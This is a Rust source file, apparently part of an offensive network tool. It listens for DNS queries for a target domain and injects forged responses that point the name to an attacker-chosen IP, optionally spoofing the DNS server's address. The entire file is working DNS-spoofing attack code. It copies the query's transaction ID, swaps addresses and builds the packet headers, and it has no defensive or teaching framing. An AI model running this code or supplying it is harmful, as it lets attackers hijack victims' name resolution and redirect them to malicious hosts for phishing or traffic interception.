use crate::utils::{compute_ipv4_checksum, open_capture, parse_domain_labels};
use std::time::Duration;

pub fn run(
    interface: &str,
    domain: &str,
    forged_ip: [u8; 4],
    spoofed_dns: Option<[u8; 4]>,
) -> Result<(), String> {
    let mut cap = open_capture(interface)?;
    cap.filter("udp dst port 53", true)
        .map_err(|e| format!("pcap filter error: {e}"))?;
    cap.set_timeout(Duration::from_millis(200))
        .map_err(|e| e.to_string())?;

    println!("[*] Listening for DNS queries for {domain} on {interface} ...");
    while let Ok(packet) = cap.next_packet() {
        if let Some(response) = build_response(&packet.data, domain, forged_ip, spoofed_dns) {
            cap.sendpacket(response)
                .map_err(|e| format!("pcap send error: {e}"))?;
            println!("[+] Spoofed response sent for {domain}");
        }
    }

    Ok(())
}

fn build_response(
    packet: &[u8],
    domain: &str,
    forged_ip: [u8; 4],
    spoofed_dns: Option<[u8; 4]>,
) -> Option<Vec<u8>> {
    if packet.len() < 14 + 20 + 8 + 12 {
        return None;
    }

    let eth_dst = &packet[0..6];
    let eth_src = &packet[6..12];

    let ip_header = &packet[14..34];
    let src_ip = [ip_header[12], ip_header[13], ip_header[14], ip_header[15]];
    let dst_ip = [ip_header[16], ip_header[17], ip_header[18], ip_header[19]];
    let udp_header = &packet[34..42];
    let src_port = (udp_header[0] as u16) << 8 | udp_header[1] as u16;
    let dst_port = (udp_header[2] as u16) << 8 | udp_header[3] as u16;

    let dns_start = 42;
    let dns_bytes = &packet[dns_start..];
    if dns_bytes.len() < 12 {
        return None;
    }

    let qdcount = (dns_bytes[4] as u16) << 8 | dns_bytes[5] as u16;
    if qdcount == 0 {
        return None;
    }

    let (name, offset) = parse_domain_labels(dns_bytes, 12)?;
    if dns_bytes.len() < offset + 4 {
        return None;
    }
    if name.to_ascii_lowercase() != domain.to_ascii_lowercase() {
        return None;
    }

    let question = &dns_bytes[12..offset + 4];
    let transaction_id = &dns_bytes[0..2];

    let mut dns_response = Vec::new();
    dns_response.extend_from_slice(transaction_id);
    dns_response.extend_from_slice(&[0x81, 0x80]);
    dns_response.extend_from_slice(&[0x00, 0x01]);
    dns_response.extend_from_slice(&[0x00, 0x01]);
    dns_response.extend_from_slice(&[0x00, 0x00]);
    dns_response.extend_from_slice(&[0x00, 0x00]);
    dns_response.extend_from_slice(question);

    // answer record
    dns_response.extend_from_slice(&[0xc0, 0x0c]); // pointer to name
    dns_response.extend_from_slice(&[0x00, 0x01]); // type A
    dns_response.extend_from_slice(&[0x00, 0x01]); // class IN
    dns_response.extend_from_slice(&[0x00, 0x00, 0x00, 0x3c]); // TTL 60s
    dns_response.extend_from_slice(&[0x00, 0x04]); // rdlength
    dns_response.extend_from_slice(&forged_ip);

    let udp_len = (8 + dns_response.len()) as u16;
    let ip_len = (20 + udp_len) as u16;

    let mut ipv4 = Vec::with_capacity(14 + 20 + udp_len as usize);
    // Ethernet header
    ipv4.extend_from_slice(eth_src); // swap
    ipv4.extend_from_slice(eth_dst);
    ipv4.extend_from_slice(&[0x08, 0x00]);

    // IPv4 header
    ipv4.push(0x45);
    ipv4.push(0x00);
    ipv4.extend_from_slice(&ip_len.to_be_bytes());
    ipv4.extend_from_slice(&[0x00, 0x00]);
    ipv4.extend_from_slice(&[0x40, 0x00]);
    ipv4.push(64);
    ipv4.push(17); // UDP
    ipv4.extend_from_slice(&[0x00, 0x00]); // checksum placeholder
    let src_ip_bytes = spoofed_dns.unwrap_or(dst_ip);
    ipv4.extend_from_slice(&src_ip_bytes);
    ipv4.extend_from_slice(&src_ip);

    let checksum = compute_ipv4_checksum(&ipv4[14..34]);
    ipv4[24] = checksum[0];
    ipv4[25] = checksum[1];

    // UDP header
    ipv4.extend_from_slice(&dst_port.to_be_bytes());
    ipv4.extend_from_slice(&src_port.to_be_bytes());
    ipv4.extend_from_slice(&udp_len.to_be_bytes());
    ipv4.extend_from_slice(&[0x00, 0x00]); // UDP checksum omitted for brevity

    ipv4.extend_from_slice(&dns_response);

    Some(ipv4)
}
